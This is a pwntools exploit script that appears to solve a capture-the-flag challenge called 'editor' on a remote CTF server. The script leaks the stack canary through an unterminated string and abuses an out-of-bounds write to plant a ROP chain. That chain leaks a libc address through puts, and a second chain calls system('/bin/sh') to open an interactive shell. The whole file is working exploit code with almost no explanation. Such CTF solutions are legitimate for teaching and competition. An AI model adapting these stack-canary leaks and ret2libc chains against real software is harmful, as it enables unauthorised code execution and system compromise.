from pwn import *

#init

e = ELF('./editor')
libc = ELF('./libc-2.31.so')

context.binary = e

#p = process(e.path)
p = remote('editor.lit-ctf-2021-2-codelab.kctf.cloud', 1337)

#funcs

def ad(x, y):
    p.sendlineafter('?', '1')
    p.sendlineafter('!', str(x))
    p.sendlineafter('!', bytes([y]))

def ex():
    p.sendlineafter('?', '3')
    p.recvuntil('wanted!\n')

def add(s):
    s = b'a' * 136 + p64(canary) + b'a' * 8 + s
    for i in range(len(s)):
        ad(i, max(0x1, s[i]))

    for i in reversed(range(len(s))):
        if s[i] == 0:
            ad(i, s[i])

#vars

pop_rdi = 0x40140b
puts_got = e.got['puts']
puts_off = libc.sym['puts']
system_off = libc.sym['system']
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Pop rdi adr: ' + hex(pop_rdi))
log.info('Puts got adr: ' + hex(puts_got))
log.info('Puts libc off: ' + hex(puts_off))
log.info('System libc off: ' + hex(system_off))
log.info('Binsh libc off: ' + hex(binsh_off))

#exploit

#leak canary c string vuln

p.sendlineafter(':', 'a' * 135 + '#')
p.sendlineafter('?', '2')

p.recvuntil('#\n')
canary = u64(b'\0' + p.recv(7))

log.info('Canary: ' + hex(canary))

#out of bound strcpy and rop leak libc then return to main

rop = ROP(e)
rop.puts(puts_got)
rop.main()

add(rop.chain())

ex()

libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off

log.info('Libc off adr: ' + hex(libc_off))

#rop system('/bin/sh')

add(p64(pop_rdi + 1) + p64(pop_rdi) + p64(libc_off + binsh_off) + p64(libc_off + system_off))

ex()

#pray for flag

p.interactive()
